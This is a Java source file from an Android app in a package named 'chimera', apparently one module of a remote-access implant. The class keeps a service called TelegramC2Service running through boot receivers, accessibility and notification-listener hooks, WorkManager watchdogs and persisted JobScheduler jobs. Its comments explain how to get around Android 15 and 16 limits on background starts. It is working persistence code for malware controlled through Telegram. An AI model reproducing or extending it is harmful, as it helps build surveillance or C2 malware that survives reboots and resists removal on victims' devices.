package com.chimera;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import java.util.concurrent.TimeUnit;

/**
 * Central resurrection entry point called from *every* anchor:
 * BootReceiver, ChimeraApplication, FCMHandlerService, AccessibilityService, NotificationListener, WorkManager.
 * Decides smart fallback based on NetworkStateMonitor.
 */
public class ResurrectionHelper {

    public static final String WATCHDOG_WORK = "chimera_watchdog";
    public static final String RESURRECT_WORK = "chimera_resurrect";

    public static void resurrect(Context ctx) {
        try {
            Context app = ctx.getApplicationContext();
            // Always ensure monitors initialized
            NetworkStateMonitor.init(app);
            // 1. Try to start FGS if not airplane/no net? Actually FGS can start even offline, but we gate heavy transports later
            // Use allowed exemption: startForegroundService via WorkManager or FCM is safe. From BOOT we use WorkManager -> ResurrectionJobService -> FGS
            scheduleResurrectionWork(app);
            scheduleWatchdog(app);
            scheduleJobScheduler(app);
            // Direct attempt if validated or if via FCM/BOOT exemption we can still start remoteMessaging type
            if (NetworkStateMonitor.isAirplaneModeOn(app)) {
                // Don't attempt network transports, but still ensure FGS started for local listening?
                // FGS start is still allowed even in airplane (no net) - keep process alive
            }
            startCoreServiceIfNeeded(app);
        } catch (Exception e) { ErrorLogger.logError(ctx, "Resurrection", e); }
    }

    private static void startCoreServiceIfNeeded(Context ctx) {
        try {
            // Check via ActivityManager if service running - best-effort
            // Just try to start; if already running, onStartCommand handles idempotently
            Intent intent = new Intent(ctx, TelegramC2Service.class);
            // Android 15: BOOT cannot start dataSync/camera etc - we use remoteMessaging/specialUse so safe
            // Use WorkManager or direct start depending on context
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    ctx.startForegroundService(intent);
                } catch (Exception e) {
                    // Fallback to WorkManager which has FGS exemption when expedited
                    scheduleResurrectionWork(ctx);
                    ErrorLogger.logError(ctx, "Resurrection_FGS_start_failed", e);
                }
            } else {
                ctx.startService(intent);
            }
        } catch (Exception e) { ErrorLogger.logError(ctx, "startCoreService", e); }
    }

    public static void scheduleWatchdog(Context ctx) {
        try {
            Constraints c = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .setRequiresBatteryNotLow(false)
                    .build();
            // Android 16 quota: 10min every 30min Active -> so 15min periodic is safe
            PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(WatchdogWorker.class, 15, TimeUnit.MINUTES)
                    .setConstraints(c)
                    .addTag(WATCHDOG_WORK)
                    .build();
            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(WATCHDOG_WORK, ExistingPeriodicWorkPolicy.KEEP, req);
        } catch (Exception e) { ErrorLogger.logError(ctx, "scheduleWatchdog", e); }
    }

    public static void scheduleResurrectionWork(Context ctx) {
        try {
            OneTimeWorkRequest req = new OneTimeWorkRequest.Builder(ResurrectionWorker.class)
                    .setConstraints(new Constraints.Builder().setRequiredNetworkType(NetworkType.NOT_REQUIRED).build())
                    .addTag(RESURRECT_WORK)
                    .build();
            WorkManager.getInstance(ctx).enqueueUniqueWork(RESURRECT_WORK, ExistingWorkPolicy.REPLACE, req);
        } catch (Exception e) { ErrorLogger.logError(ctx, "scheduleResurrectionWork", e); }
    }

    public static void scheduleJobScheduler(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;
            ComponentName cn = new ComponentName(ctx, ResurrectionJobService.class);
            // Android 16: setImportantWhileForeground deprecated -> use setExpedited + persisted
            JobInfo.Builder b = new JobInfo.Builder(1001, cn)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)
                    .setBackoffCriteria(10_000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                    .setPeriodic(15 * 60 * 1000); // 15min
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                b.setEstimatedNetworkBytes(1024, 1024);
            }
            // For expedited we need separate job; here periodic is non-expedited to survive quota
            js.schedule(b.build());

            // One-time expedited resurrection job for immediate
            JobInfo oneTime = new JobInfo.Builder(1002, cn)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(false)
                    .setMinimumLatency(5_000)
                    .setOverrideDeadline(15_000)
                    .build();
            js.schedule(oneTime);
        } catch (Exception e) { ErrorLogger.logError(ctx, "scheduleJobScheduler", e); }
    }

    public static void cancelAll(Context ctx) {
        try { WorkManager.getInstance(ctx).cancelUniqueWork(WATCHDOG_WORK); } catch (Exception ignored) {}
    }
}
